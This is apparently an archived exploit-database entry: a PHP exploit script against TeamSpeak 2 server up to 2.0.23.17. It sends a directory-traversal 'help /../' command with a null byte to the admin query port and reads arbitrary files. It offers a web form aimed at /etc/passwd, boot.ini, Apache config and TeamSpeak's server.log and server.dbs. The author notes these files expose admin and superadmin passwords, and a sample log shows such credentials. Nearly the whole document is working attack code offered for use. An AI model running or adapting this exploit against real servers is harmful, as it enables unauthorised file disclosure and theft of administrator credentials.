<html><head><title>TeamSpeak <= 2.0.23.17 Remote File Disclosure Vulnerability</title></head><pre>&lt;?php
// teamspeak server &lt;= 2.0.23.17 remote read file vulnerability
// bug found and exploit write by c411k
// http://www.heise-online.co.uk/security/Vulnerability-in-TeamSpeak-2-server--/news/93734 zazhali ploent svolo4i!!
// tested on win ts2_server_rc2_202317, ts2_server_rc2_20201.exe
// grats all https://forum.antichat.ru
// use http://localhost/ts_xek.php
// 10.01.09

error_reporting(0);
@ini_set(&quot;max_execution_time&quot;,0);
@ini_set('output_buffering',0);
@set_magic_quotes_runtime(0);
@set_time_limit(0);
@ob_implicit_flush(1);

header(&quot;Content-Type: text/html; charset=utf-8\r\n&quot;);
header(&quot;Pragma: no-cache&quot;);

function check_ver($site, $xek, $port)
{
	$url = fsockopen(&quot;$site&quot;, &quot;$port&quot;, $errno, $errstr, 22);
	$send_pac = &quot;$xek\r\n\r\n&quot;;
	fputs($url, $send_pac);
	$s = '';
	
	while (!feof($url) and strpos(implode($s), 'OK') === false)
	{
		$s[] = fgets($url, 1028);
	}
	fclose($url);
	return implode($s);
}

function html()
{
	if (isset($_POST['file']))
		$file = $_POST['file'];
	else $file = '../../../../../etc/passwd';
	echo 
	'&lt;pre&gt;&lt;form action=&quot;'.$_SERVER['PHP_SELF'].'?go_fuck&quot; method=&quot;post&quot;&gt;
	&lt;input style=&quot;background-color: #31333B; color: #B9B9BD; border-color: #646C71;&quot; name=&quot;parampampam&quot; type=&quot;submit&quot; value=&quot;&amp;#8194;read file...&amp;#8194;&quot;&gt;
	&lt;input style=&quot;background-color: #31333B; color: #B9B9BD; border-color: #646C71;&quot; name=&quot;check_ver&quot; type=&quot;submit&quot; value=&quot;&amp;#8194;check_version&amp;#8194;&quot;&gt;&lt;br&gt;
	&lt;input style=&quot;background-color: #31333B; color: #B9B9BD;&quot; name=&quot;hostname&quot; value=&quot;localhost&quot;&gt;&lt;font color=&quot;#B9B9BD&quot;&gt;&amp;#8194;&amp;#172; teamspeak hostname or ip, for expamle &quot;ts.antichat.ru&quot;
	&lt;input style=&quot;background-color: #31333B; color: #B9B9BD;&quot; name=&quot;port&quot; value=&quot;51234&quot;&gt;&lt;font color=&quot;#B9B9BD&quot;&gt;&amp;#8194;&amp;#172; port to TCQquery admin, default 51234
	&lt;input style=&quot;background-color: #31333B; color: #B9B9BD;&quot; name=&quot;file&quot; value=&quot;'.$file.'&quot;&gt;&lt;font color=&quot;#B9B9BD&quot;&gt;&amp;#8194;&amp;#172; file to read.';
}

function info()
{
	echo
	'&lt;br&gt;
	for example: 
	server.log
	server.dbs
	../../../../../boot.ini
	../../../../../etc/passwd
	../../../../../usr/local/apache/conf/httpd.conf etc.
	brain on ;)
	
	admin and superadmin passwords you can see in server.log or server.dbs. but in windows i can\'t read this files.
	
	&lt;textarea style=&quot;background-color: #31333B; color: #B9B9BD;&quot; name=&quot;zz&quot; cols=90 rows=16&gt;---------------------------------------------------------------
-------------- log started at 10-01-09 00:24 -------------
---------------------------------------------------------------
10-01-09 00:24:28,ALL,Info,server,	Server init initialized
10-01-09 00:24:28,ALL,Info,server,	Server version: 2.0.20.1 Win32
10-01-09 00:24:28,WARNING,Info,SQL,	created table ts2_servers
10-01-09 00:24:28,WARNING,Info,SQL,	created table ts2_server_privileges
10-01-09 00:24:28,WARNING,Info,SQL,	created table ts2_channels
10-01-09 00:24:28,WARNING,Info,SQL,	created table ts2_channel_privileges
10-01-09 00:24:28,WARNING,Info,SQL,	created table ts2_clients
10-01-09 00:24:28,WARNING,Info,SQL,	created table ts2_bans
10-01-09 00:24:28,ALL,Info,server,	Starting VirtualServer id:1 with port:8767
10-01-09 00:24:28,WARNING,Info,SERVER,	Default VirtualServer created
10-01-09 00:24:28,WARNING,Info,SERVER,	admin account info: username: admin password: kcqy8y
10-01-09 00:24:28,WARNING,Info,SERVER,	superadmin account info: username: superadmin password: e7em45
10-01-09 00:24:29,ALL,Info,server,	Server init finished&lt;/textarea&gt;&lt;/form&gt;';
}

function head()
{
	echo '&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot;&gt;
&lt;title&gt;xek_teamspeak2&lt;/title&gt;
&lt;style&gt;
&lt;!--
A:link {COLOR: #B9B9BD; TEXT-DECORATION: none}
A:visited {COLOR: #B9B9BD; TEXT-DECORATION: none}
A:active {COLOR: #228B22; TEXT-DECORATION: none}
A:hover {COLOR: #E7E7EB; TEXT-DECORATION: underline}
BODY
{
	margin=&quot;5&quot;;
	FONT-WEIGHT: normal; 
	COLOR: #B9B9BD; 
	BACKGROUND: #44474F; 
	FONT-FAMILY: Courier new, Courier, Verdana, Arial, Helvetica, sans-serif; 
}

--&gt;
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;';
}

head();

if (!$_GET)
{
	html();
	info();
}

if (isset($_GET['go_fuck']))
{
	$hostname = $_POST['hostname'];
	$file = $_POST['file'];
	$port = $_POST['port'];
	
	if (isset($_POST['check_ver']))
	{
		echo '&lt;pre&gt;'.check_ver($hostname, 'ver', $port);
		
	}
	
	if (isset($_POST['parampampam']))
	{
		echo '&lt;textarea style=&quot;background-color: #31333B; color: #B9B9BD;&quot; name=&quot;zz&quot; cols=90 rows=16&gt;'.check_ver($hostname, 'help /../'.$file.&quot;\0&quot;, $port).'&lt;/textarea&gt;';
		html();
		
	}
}

?&gt;

# milw0rm.com [2009-01-14]</pre></html>